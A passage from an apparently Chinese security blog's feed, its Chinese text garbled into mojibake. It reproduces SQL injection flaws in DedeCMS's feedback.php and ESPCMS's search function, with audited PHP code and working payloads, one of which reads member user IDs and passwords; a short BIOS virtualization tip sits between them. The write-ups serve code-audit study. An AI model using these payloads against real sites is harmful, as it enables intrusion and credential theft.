‡é¢˜ï¼Œæ„å»ºpayloadçš„åœ°æ–¹ï¼Œå…¶ä»–å‚æ•°å®¡è®¡å¾—åˆ°</p><p>æ³¨é‡ŠéªŒè¯ç </p><p><img src="https://z3.ax1x.com/2021/11/30/o37sp9.png" alt="o37sp9.png"></p><p>æ‰§è¡Œæ³¨å…¥å°±ä¼šå‘è¡¨ä¸€æ¡è¯„è®ºï¼Œå¯ä»¥çœ‹åˆ°æ³¨å…¥å•å¼•å·è¢«è½¬ä¹‰äº†</p><p><img src="https://z3.ax1x.com/2021/11/30/o3TXW9.png" alt="o3TXW9.png"></p><p><img src="https://z3.ax1x.com/2021/11/30/o37PoD.png" alt="o37PoD.png"></p><p>ç¬¬äºŒæ¬¡æ³¨å…¥</p><p>åœ¨ç¬¬ä¸€æ¡è¯„è®ºä¸Šæ³¨å…¥</p><p>fidä¸ºè¯„è®ºçš„IDå·</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">get  http:<span class="token comment">//dedecms/plus/feedback.php?aid=1</span>post  <span class="token keyword">action</span><span class="token operator">=</span>send<span class="token operator">&amp;</span>comtype<span class="token operator">=</span>reply<span class="token operator">&amp;</span>fid<span class="token operator">=</span><span class="token number">1</span><span class="token operator">&amp;</span>isconfirm<span class="token operator">=</span>yes<span class="token operator">&amp;</span>validate<span class="token operator">=</span>xx<span class="token operator">&amp;</span>msg<span class="token operator">=</span><span class="token operator">*</span><span class="token operator">/</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">select</span><span class="token comment">/**/</span>concat<span class="token punctuation">(</span>userid<span class="token punctuation">,</span><span class="token number">0x3a</span><span class="token punctuation">,</span>pwd<span class="token punctuation">)</span><span class="token comment">/**/</span><span class="token keyword">from</span><span class="token comment">/**/</span>xxxxx_member<span class="token comment">/**/</span><span class="token keyword">limit</span><span class="token comment">/**/</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">23</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://z3.ax1x.com/2021/11/30/o37VSA.png" alt="o37VSA.png"></p><p><img src="https://z3.ax1x.com/2021/11/30/o37Yyq.png" alt="o37Yyq.png"></p><p>è¿™é‡Œå¯ä»¥è¯å®è¯»å–å‡ºæ¥çš„acrtitleæ˜¯æ²¡æœ‰è½¬ä¹‰çš„ï¼Œå†å’Œmsgæ‹¼æ¥å°±é€ æˆäº†æ¶æ„sqlä»£ç çš„æ‰§è¡Œï¼Œå¹¶ä¸”æŠŠæ‰§è¡Œç»“æœæš´éœ²å‡ºæ¥äº†</p><p>è‡³æ­¤å¤ç°æˆåŠŸ</p><p>è¿™é‡Œè´´ä¸€ä¸‹åå°çš„æ•°æ®åº“</p><p><img src="https://z3.ax1x.com/2021/11/30/o37dTU.png" alt="o37dTU.png"></p>]]></content>
      
      
      <categories>
          
          <category> web </category>
          
          <category> æ¼æ´å¤ç° </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql </tag>
            
            <tag> ä»£ç å®¡è®¡ </tag>
            
            <tag> æ¼æ´å¤ç° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å¼€å¯è™šæ‹ŸåŒ–</title>
      <link href="/2021/11/27/kai-qi-xu-ni-hua/"/>
      <url>/2021/11/27/kai-qi-xu-ni-hua/</url>
      
        <content type="html"><![CDATA[<h1 id="å¼€å¯è™šæ‹ŸåŒ–"><a href="#å¼€å¯è™šæ‹ŸåŒ–" class="headerlink" title="å¼€å¯è™šæ‹ŸåŒ–"></a>å¼€å¯è™šæ‹ŸåŒ–</h1><p>æˆ‘çš„CPUæ˜¯AMDï¼ŒIntelä¹Ÿå·®ä¸å¤š</p><p>åœ¨vmwareåˆ›å»ºè™šæ‹Ÿæœºæ—¶ï¼Œå¼€å¯äº†AMD-Vï¼Œå¦‚å›¾</p><p><img src="https://z3.ax1x.com/2021/11/30/o3oLvt.png" alt="o3oLvt.png"></p><p>å¯èƒ½ä¼šé‡åˆ°è¿™ç§æƒ…å†µ</p><p><img src="https://z3.ax1x.com/2021/11/30/o3ojDf.png" alt="o3ojDf.png"></p><p>è¿™æ—¶æˆ‘ä»¬éœ€è¦è¿›å…¥BIOSï¼Œå¼€å¯è™šæ‹ŸåŒ–AMD-V</p><p>å¼€æœºæˆ–é‡å¯ï¼ˆè¿›å…¥ç³»ç»Ÿä¹‹å‰ï¼‰æŒ‰ä¸‹F2æˆ–è€…Deleteï¼ˆå„å“ç‰Œç”µè„‘ç”µè„‘æœ‰å·®åˆ«ï¼Œè‡ªè¡ŒæŸ¥é˜…ï¼‰</p><p><img src="https://z3.ax1x.com/2021/11/30/o3Ti2n.jpg" alt="o3Ti2n.jpg"></p><p>è¿›å…¥è¿™ä¸ªé¡µé¢Configurationï¼Œé€‰æ‹©AMD SVM Technologyï¼Œæ”¹ä¸ºEnableï¼ŒF10ä¿å­˜é€€å‡º</p>]]></content>
      
      
      <categories>
          
          <category> tip </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tip </tag>
            
            <tag> windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>espcmsæœç´¢æ³¨å…¥</title>
      <link href="/2021/11/25/espcms-sou-suo-zhu-ru/"/>
      <url>/2021/11/25/espcms-sou-suo-zhu-ru/</url>
      
        <content type="html"><![CDATA[<h1 id="espcmsæœç´¢æ³¨å…¥"><a href="#espcmsæœç´¢æ³¨å…¥" class="headerlink" title="espcmsæœç´¢æ³¨å…¥"></a>espcmsæœç´¢æ³¨å…¥</h1><h2 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h2><p>äºŒæ¬¡urldecodeæ³¨å…¥</p><p>ä½¿ç”¨äº†<code>urldecode</code>æˆ–è€…<code>rawurldecode</code>å‡½æ•°å¯èƒ½ä¼šå¯¼è‡´å•å¼•å·ï¼ˆâ€™ï¼‰ã€åŒå¼•å·ï¼ˆâ€ï¼‰ã€åæ–œæ ï¼ˆ/ï¼‰ç­‰ç¬¦å·è¢«æ³¨å…¥åˆ°è¯­å¥ï¼Œè¿›è€Œäº§ç”Ÿæ¼æ´</p><p><code>addslashes()</code>ã€<code>mysql_real_escape_string()</code>ã€<code>mysql_escape_string()</code>ç­‰å‡½æ•°èƒ½å¯¹<code>urldecode()</code>åçš„ç»“æœå¤„ç†ï¼Œä»è€Œé¿å…äº§ç”Ÿæ¼æ´</p><p>eg:</p><p><code>xx.php?id=1%2527</code>ï¼Œæµè§ˆå™¨æ¥æ”¶åå…ˆè¿›è¡Œä¸€æ¬¡è‡ªè§£ç <code>id=1%27</code>ï¼Œ%25è§£ç ä¸º%ï¼Œ<code>urlencode()</code>å†è§£ç ï¼Œå˜æˆ<code>id=1'</code>ï¼Œäº§ç”Ÿæ³¨å…¥æ¼æ´</p><p>ä»£ç å®¡è®¡çš„æ—¶å€™å¯ä»¥é€šè¿‡æœç´¢è¿™ä¸¤ä¸ªå‡½æ•°<code>urldecode</code>æˆ–è€…<code>rawurldecode</code>æ¥å¯»æ‰¾æ¼æ´</p><h2 id="æ“ä½œæ¼”ç¤º"><a href="#æ“ä½œæ¼”ç¤º" class="headerlink" title="æ“ä½œæ¼”ç¤º"></a>æ“ä½œæ¼”ç¤º</h2><p>å…ˆæ­å»ºç¯å¢ƒï¼Œè¿›å…¥é¦–é¡µï¼Œé…ç½®å¥½æ•°æ®åº“åŠå…¶ä»–é…ç½®</p><p>æ¼æ´åœ¨<code>interface/search.php</code>æ–‡ä»¶å’Œ<code>interface/3gwap_search.php</code>æ–‡ä»¶<code>in_taglist()</code>å‡½æ•°</p><p><img src="https://z3.ax1x.com/2021/11/25/oAD734.png" alt="oAD734.png"></p><p>å¯ä»¥çœ‹åˆ°ä¸€ä¸ªæœç´¢æ¡†å’Œä¸¤ä¸ªå‚æ•°ï¼Œå®¡è®¡ä»£ç </p><p>ä»£ç ä¸­æœ‰ä¸‰ä¸ªå‡½æ•°ï¼Œ<code>in_list(),in_result(),in_taglist()</code>ï¼Œç¬¬äºŒå‡½æ•°åº”è¯¥æ˜¯è°ƒç”¨å‡½æ•°ï¼Œé˜…è¯»ä»£ç å¾—åˆ°ç¬¬ä¸‰ä¸ªå‚æ•°æ˜¯tagkey</p><p>å‡½æ•°ä»£ç </p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">in_taglist</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword static-context">parent</span><span class="token operator">::</span><span class="token function">start_pagetemplate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">include_once</span> admin_ROOT <span class="token operator">.</span> <span class="token string single-quoted-string">'public/class_pagebotton.php'</span><span class="token punctuation">;</span><span class="token variable">$page</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">fun</span><span class="token operator">-&gt;</span><span class="token function">accept</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'page'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'G'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$page</span> <span class="token operator">=</span> <span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span> <span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token variable">$lng</span> <span class="token operator">=</span> <span class="token punctuation">(</span>admin_LNG <span class="token operator">==</span> <span class="token string single-quoted-string">'big5'</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token constant">CON</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'is_lancode'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> admin_LNG<span class="token punctuation">;</span><span class="token variable">$tagkey</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">fun</span><span class="token operator">-&gt;</span><span class="token function">accept</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'tagkey'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'R'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$tagkey</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">fun</span><span class="token operator">-&gt;</span><span class="token function">inputcodetrim</span><span class="token punctuation">(</span><span class="token variable">$tagkey</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$db_where</span> <span class="token operator">=</span> <span class="token string single-quoted-string">' WHERE lng=\''</span> <span class="token operator">.</span> <span class="token variable">$lng</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'\' AND isclass=1'</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$tagkey</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token variable">$linkURL</span> <span class="token operator">=</span> <span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'HTTP_REFERER'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">callmessage</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">lng</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'search_err'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$linkURL</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">lng</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'gobackbotton'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$tagkey</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token variable">$db_where</span><span class="token operator">.=</span><span class="token string double-quoted-string">" AND FIND_IN_SET('<span class="token interpolation"><span class="token variable">$tagkey</span></span>',tags)"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$pagemax</span> <span class="token operator">=</span> <span class="token number">20</span><span class="token punctuation">;</span><span class="token variable">$pagesylte</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token variable">$templatesDIR</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">get_templatesdir</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'article'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$templatefilename</span> <span class="token operator">=</span> <span class="token variable">$lng</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/'</span> <span class="token operator">.</span> <span class="token variable">$templatesDIR</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'/search'</span><span class="token punctuation">;</span><span class="token variable">$db_table</span> <span class="token operator">=</span> db_prefix <span class="token operator">.</span> <span class="token string single-quoted-string">'document'</span><span class="token punctuation">;</span><span class="token variable">$countnum</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">db_numrows</span><span class="token punctuation">(</span><span class="token variable">$db_table</span><span class="token punctuation">,</span> <span class="token variable">$db_where</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$countnum</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token variable">$numpage</span> <span class="token operator">=</span> <span class="token function">ceil</span><span class="token punctuation">(</span><span class="token variable">$countnum</span> <span class="token operator">/</span> <span class="token variable">$pagemax</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span><span class="token variable">$numpage</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT did,lng,pid,mid,aid,tid,sid,fgid,linkdid,isclass,islink,ishtml,ismess,isorder,purview,recommend,tsn,title,longtitle,color,author,source,pic,link,oprice,bprice,click,description,keywords,addtime,template,filename,filepath FROM <span class="token interpolation"><span class="token variable">$db_table</span></span> <span class="token interpolation"><span class="token variable">$db_where</span></span> LIMIT 0,<span class="token interpolation"><span class="token variable">$pagemax</span></span>"</span><span class="token punctuation">;</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">htmlpage</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PageBotton</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">,</span> <span class="token variable">$pagemax</span><span class="token punctuation">,</span> <span class="token variable">$page</span><span class="token punctuation">,</span> <span class="token variable">$countnum</span><span class="token punctuation">,</span> <span class="token variable">$numpage</span><span class="token punctuation">,</span> <span class="token variable">$pagesylte</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token constant">CON</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file_fileex'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">lng</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pagebotton'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">lng</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'gopageurl'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token constant">CON</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'is_rewrite'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">htmlpage</span><span class="token operator">-&gt;</span><span class="token function">PageSQL</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'pid,did'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'down'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$rs</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">db</span><span class="token operator">-&gt;</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$rsList</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">db</span><span class="token operator">-&gt;</span><span class="token function">fetch_assoc</span><span class="token punctuation">(</span><span class="token variable">$rs</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token variable">$rsList</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'typename'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">get_type</span><span class="token punctuation">(</span><span class="token variable">$rsList</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tid'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'typename'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$rsList</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'link'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">get_link</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'doc'</span><span class="token punctuation">,</span> <span class="token variable">$rsList</span><span class="token punctuation">,</span> admin_LNG<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$rsList</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'buylink'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">get_link</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'buylink'</span><span class="token punctuation">,</span> <span class="token variable">$rsList</span><span class="token punctuation">,</span> admin_LNG<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$rsList</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'enqlink'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">get_link</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'enqlink'</span><span class="token punctuation">,</span> <span class="token variable">$rsList</span><span class="token punctuation">,</span> admin_LNG<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$rsList</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctitle'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$rsList</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'color'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$rsList</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'title'</span><span class="token punctuation">]</span> <span class="token punctuation">:</span> <span class="token string double-quoted-string">"&lt;font color='"</span> <span class="token operator">.</span> <span class="token variable">$rsList</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'color'</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"'&gt;"</span> <span class="token operator">.</span> <span class="token variable">$rsList</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'title'</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string double-quoted-string">"&lt;/font&gt;"</span><span class="token punctuation">;</span><span class="token variable">$rsList</span><span class="token punctuation">[</span><span class="token variable">$keyname</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">str_ireplace</span><span class="token punctuation">(</span><span class="token variable">$keyword</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'&lt;font color="#F00000"&gt;&lt;u&gt;'</span> <span class="token operator">.</span> <span class="token variable">$keyword</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;/u&gt;&lt;/font&gt;'</span><span class="token punctuation">,</span> <span class="token variable">$rsList</span><span class="token punctuation">[</span><span class="token variable">$keyname</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$array</span><span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$rsList</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">pagetemplate</span><span class="token operator">-&gt;</span><span class="token function">assign</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'pagetext'</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">htmlpage</span><span class="token operator">-&gt;</span><span class="token function">PageStat</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">lng</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'pagetext'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">pagetemplate</span><span class="token operator">-&gt;</span><span class="token function">assign</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'pagebotton'</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">htmlpage</span><span class="token operator">-&gt;</span><span class="token function">PageList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">pagetemplate</span><span class="token operator">-&gt;</span><span class="token function">assign</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'pagenu'</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">htmlpage</span><span class="token operator">-&gt;</span><span class="token function">Bottonstyle</span><span class="token punctuation">(</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">pagetemplate</span><span class="token operator">-&gt;</span><span class="token function">assign</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'pagese'</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">htmlpage</span><span class="token operator">-&gt;</span><span class="token function">pageSelect</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">pagetemplate</span><span class="token operator">-&gt;</span><span class="token function">assign</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'pagevt'</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">htmlpage</span><span class="token operator">-&gt;</span><span class="token function">Prevbotton</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">pagetemplate</span><span class="token operator">-&gt;</span><span class="token function">assign</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'array'</span><span class="token punctuation">,</span> <span class="token variable">$array</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">pagetemplate</span><span class="token operator">-&gt;</span><span class="token function">assign</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'path'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'search'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">unset</span><span class="token punctuation">(</span><span class="token variable">$array</span><span class="token punctuation">,</span> <span class="token variable">$typeread</span><span class="token punctuation">,</span> <span class="token variable">$modelview</span><span class="token punctuation">,</span> <span class="token variable">$LANPACK</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">lng</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">pagetemplate</span><span class="token operator">-&gt;</span><span class="token function">display</span><span class="token punctuation">(</span><span class="token variable">$templatefilename</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'search'</span><span class="token punctuation">,</span> <span class="token constant boolean">false</span><span class="token punctuation">,</span> <span class="token variable">$filename</span><span class="token punctuation">,</span> admin_LNG<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é‡Œé¢çš„å‡ æ¡é‡è¦è¯­å¥</p><p><code>$tagkey = urldecode($this-&gt;fun-&gt;accept('tagkey', 'R'));</code>è¿™å¥è¯­å¥å°±æ˜¯æ¼æ´çš„æ ¹æºï¼Œfunå…ˆæ£€æµ‹ï¼Œurlencodeå†è½¬ä¹‰</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$tagkey</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token variable">$db_where</span><span class="token operator">.=</span><span class="token string double-quoted-string">" AND FIND_IN_SET('<span class="token interpolation"><span class="token variable">$tagkey</span></span>',tags)"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>ä¸ä¸ºç©ºå°±æ‹¼æ¥æˆwhereå­å¥</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT did,lng,pid,mid,aid,tid,sid,fgid,linkdid,isclass,islink,ishtml,ismess,isorder,purview,recommend,tsn,title,longtitle,color,author,source,pic,link,oprice,bprice,click,description,keywords,addtime,template,filename,filepath FROM <span class="token interpolation"><span class="token variable">$db_table</span></span> <span class="token interpolation"><span class="token variable">$db_where</span></span> LIMIT 0,<span class="token interpolation"><span class="token variable">$pagemax</span></span>"</span><span class="token punctuation">;</span><span class="token variable">$rs</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">db</span><span class="token operator">-&gt;</span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>åˆ›å»ºå¹¶ä¸”æ‰§è¡Œsqlè¯­å¥ï¼Œå¯ä»¥çœ‹åˆ°ä¸­é—´å¹¶æ²¡æœ‰å…¶ä»–çš„æ‰‹æ®µ</p><p><img src="https://z3.ax1x.com/2021/11/25/oADOD1.png" alt="oADOD1.png"></p><p>åœ¨å¦‚å›¾æ·»åŠ ä¸€æ¡å›æ˜¾ï¼Œæ–¹ä¾¿è°ƒè¯•</p><p><img src="https://z3.ax1x.com/2021/11/25/oADXHx.png" alt="oADXHx.png"></p><p>å¯ä»¥çœ‹åˆ°å•å¼•å·è¢«è½¬ä¹‰äº†ï¼Œè¿™æ—¶åˆ©ç”¨<code>urldecode()</code>çš„ç‰¹æ€§ï¼ŒæŠ¥é”™å­˜åœ¨æ³¨å…¥</p><p><img src="https://z3.ax1x.com/2021/11/25/oArpCD.png" alt="oArpCD.png"></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$db_where</span> <span class="token operator">=</span> <span class="token string single-quoted-string">' WHERE lng=\''</span> <span class="token operator">.</span> <span class="token variable">$lng</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'\' AND isclass=1'</span><span class="token punctuation">;</span><span class="token variable">$db_where</span><span class="token operator">.=</span><span class="token string double-quoted-string">" AND FIND_IN_SET('<span class="token interpolation"><span class="token variable">$tagkey</span></span>',tags)"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>æœ‰è¿™ä¸¤æ¡è¯­å¥å¾—åˆ°æµ‹è¯•payload</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">http:<span class="token comment">//localhost/espcms/index.php?ac=search&amp;at=taglist&amp;tagkey=1%2527,tags) or 1=1 %23</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿”å›ç»“æœä¸ºçœŸ</p><p><img 